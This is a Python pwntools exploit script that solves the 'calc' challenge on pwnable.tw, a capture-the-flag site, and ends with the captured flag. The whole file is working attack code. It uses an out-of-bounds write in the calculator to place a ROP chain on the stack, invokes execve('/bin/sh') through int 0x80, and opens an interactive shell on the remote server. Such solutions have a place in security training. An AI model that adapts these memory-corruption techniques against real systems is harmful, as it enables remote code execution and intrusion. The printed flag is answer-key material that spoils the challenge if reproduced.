from pwn import *


def rop_chain(offset, value):
    r.sendline(offset)
    stack_value = int(r.recvline())
    # set stack_value 0
    if stack_value < 0:
        r.sendline(offset + b"+" + str(-stack_value).encode())
    else:
        r.sendline(offset + b"-" + str(stack_value).encode())
    r.recvline()
    # set stack_value own value
    if value > 0x7fffffff:
        r.sendline(offset + b"-" + str(0xffffffff - value + 1).encode())
    else:
        r.sendline(offset + b"+" + str(value).encode())
    r.recvline()


def offset_binsh():
    r.sendline(b"+360")
    main_ebp = int(r.recvline())
    main_esp = main_ebp & 0xfffffff0 - 0x10  # offset="+362"
    offset = main_esp + (369 - 362) * 4
    return offset


elf = ELF("calc")
r = remote("chall.pwnable.tw", 10100)
r.recvline()
with log.progress("build rop") as l:
    # execve(path='/bin/sh', argv=0, envp=0)
    rop_chain(b"+361", 0x805c34b)  # pop eax; ret
    rop_chain(b"+362", 11)  # eax = 11
    rop_chain(b"+363", 0x80701aa)  # pop edx; ret
    rop_chain(b"+364", 0)  # ecx = 0
    rop_chain(b"+365", 0x80701d1)  # pop ecx; pop ebx; ret
    rop_chain(b"+366", 0)  # edx = 0
    rop_chain(b"+367", offset_binsh())  # "/bin/sh\x00"
    rop_chain(b"+368", 0x8049a21)  # int 0x80
    rop_chain(b"+369", u32(b"/bin"))
    rop_chain(b"+370", u32(b"/sh\x00"))
    l.status("rop builded")
    r.sendline()
    l.success()
    r.interactive()

# FLAG --> FLAG{C:\Windows\System32\calc.exe}
